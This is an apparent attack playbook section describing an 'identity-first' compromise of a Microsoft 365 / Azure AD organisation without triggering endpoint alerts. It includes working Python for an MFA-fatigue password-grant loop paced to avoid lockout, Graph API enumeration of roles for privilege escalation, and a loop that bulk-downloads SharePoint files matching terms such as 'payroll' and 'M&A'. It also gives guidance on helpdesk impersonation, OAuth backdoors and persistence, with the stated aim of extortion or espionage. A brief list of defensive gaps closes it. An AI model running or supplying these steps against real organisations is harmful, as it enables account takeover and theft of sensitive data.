# Identity-first compromise

Accessing sensitive data without touching endpoints, using only identity
control planes and SaaS APIs. Goal: reach target data while generating no
endpoint alerts.

## Scope and prerequisites

- Target: organisation using Microsoft 365, Azure AD, and SaaS applications
- Entry point: at least one employee identity (obtained via phishing,
  password reuse, or helpdesk social engineering)
- Success criteria: exfiltrate data that would be material in an extortion
  or espionage scenario

## Phase 1: recon

Enumerate the organisation's external attack surface before attempting access.

```bash
# discover SSO provider from login pages
curl -s https://login.target.com | grep -i "saml\|oauth\|sso\|okta\|azure"

# enumerate employee emails from LinkedIn or OSINT sources
# (manual step: use tools like hunter.io or theHarvester)

# check for shadow IT: unapproved SaaS applications
# search job postings for technology stack hints
# check Shodan/Censys for exposed admin panels

# identify MFA type used
# check login portal for "approve this sign-in" (push MFA) vs "enter code" (TOTP)
# push MFA is vulnerable to fatigue attacks; TOTP requires phishing the code
```

## Phase 2: initial access via social engineering

### Option A: MFA fatigue

Send repeated push authentication requests to the target user until they
approve one:

```python
# automated credential stuffing with push MFA
# requires the user's password (from breach database or previous phishing)
import requests, time

url = 'https://login.microsoftonline.com/TENANT/oauth2/v2.0/token'
for i in range(20):
    r = requests.post(url, data={
        'client_id': CLIENT_ID,
        'grant_type': 'password',
        'username': TARGET_EMAIL,
        'password': TARGET_PASSWORD,
        'scope': 'https://graph.microsoft.com/.default'
    })
    if r.status_code == 200:
        print(f'[+] Approved on attempt {i+1}')
        print(r.json().get('access_token'))
        break
    time.sleep(60)  # space requests to avoid account lockout
```

### Option B: adversary-in-the-middle phishing (Evilginx or similar)

Intercepts both credentials and session tokens in real time. Covered in the
phishing section. Output: valid access token and refresh token.

### Option C: helpdesk impersonation

Call the helpdesk as the target user. Request a password reset. Provide
the minimum verification information (name, employee number, date of birth
from OSINT). Outcome depends on the helpdesk's verification strength.

## Phase 3: privilege escalation in identity plane

With a standard user token, look for escalation paths:

```python
import requests
headers = {'Authorization': f'Bearer {access_token}'}

# what roles and groups does the current identity belong to?
r = requests.get('https://graph.microsoft.com/v1.0/me/memberOf', headers=headers)
groups = [g['displayName'] for g in r.json().get('value', []) if 'displayName' in g]
print('Groups:', groups)

# check for delegated admin permissions
r = requests.get(
    'https://graph.microsoft.com/v1.0/me/transitiveMemberOf/microsoft.graph.directoryRole',
    headers=headers)
for role in r.json().get('value', []):
    print('Role:', role['displayName'])

# look for service accounts or shared accounts accessible from this identity
# (check note-taking tools, Confluence, SharePoint for documented credentials)
```

If the compromised account has low privilege, escalate by:
- Abusing consent grants to create a backdoor OAuth application with higher permissions
- Finding delegated permissions that allow role assignment or group membership changes
- Locating service account credentials in SharePoint or other accessible content

## Phase 4: collection

With sufficient access, collect high-value data:

```python
# search SharePoint for sensitive terms
for term in ['payroll', 'M&A', 'acquisition', 'redundancy', 'strategy', 'board']:
    r = requests.get(
        f"https://graph.microsoft.com/v1.0/me/drive/root/search(q='{term}')",
        headers=headers)
    items = r.json().get('value', [])
    for item in items:
        # download to attacker infrastructure via API
        dl = requests.get(
            f"https://graph.microsoft.com/v1.0/me/drive/items/{item['id']}/content",
            headers=headers)
        with open(f"/tmp/collect/{item['name']}", 'wb') as f:
            f.write(dl.content)
    import time; time.sleep(5)  # pace the requests

# harvest email for intelligence
r = requests.get(
    'https://graph.microsoft.com/v1.0/me/messages'
    '?$filter=hasAttachments eq true&$top=100',
    headers=headers)
```

## Phase 5: exfiltration

Route collected data through the OAuth application or directly to
attacker infrastructure. Do not store data on a compromised endpoint.

The exfiltration step uses techniques from the exfiltration section.
For an identity-first operation, the preference is direct API-to-API
transfer: the data never touches an endpoint the organisation controls.

## Phase 6: persistence

Before ending the session, establish persistence that survives a password
reset. Covered in the persistence section (identity-based persistence,
OAuth application backdoor).

## Defensive gaps this exposes

- MFA type: push MFA provides weaker protection than TOTP or FIDO2
- Helpdesk verification: insufficient identity proofing enables impersonation
- Privilege separation: standard users with broad SharePoint access
- DLP: absence of rate-based detection on API downloads
- UEBA: no baseline for what normal access looks like, so no alert on
  unusual access patterns
